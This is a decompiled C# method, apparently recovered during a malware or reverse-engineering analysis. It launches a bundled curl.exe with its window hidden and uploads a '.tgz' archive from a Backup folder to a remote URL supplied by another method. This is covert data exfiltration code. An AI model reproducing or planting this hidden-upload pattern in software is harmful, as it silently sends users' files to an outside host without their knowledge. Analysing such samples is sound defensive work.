// Recovered from method token 0x06000099; analyst names; not the original source.
using System.Diagnostics;
using System.Runtime.CompilerServices;

[MethodImpl(MethodImplOptions.NoInlining)]
public void Recovered_06_0099_Name()
{
	string text = Recovered_06_0083_Name();
	string text2 = Recovered_06_00a9_Name();
	string text3 = text + ".tgz";
	using Process process = new Process();
	process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\curl.exe";
	process.StartInfo.WorkingDirectory = Recovered_04_0052_Name + "\\vendor\\Backup";
	process.StartInfo.Arguments = "curl -F upload=@" + text3 + " " + text2;
	process.StartInfo.UseShellExecute = false;
	process.StartInfo.RedirectStandardOutput = true;
	process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
	process.StartInfo.CreateNoWindow = true;
	process.Start();
	process.StandardOutput.ReadToEnd();
	process.WaitForExit();
}
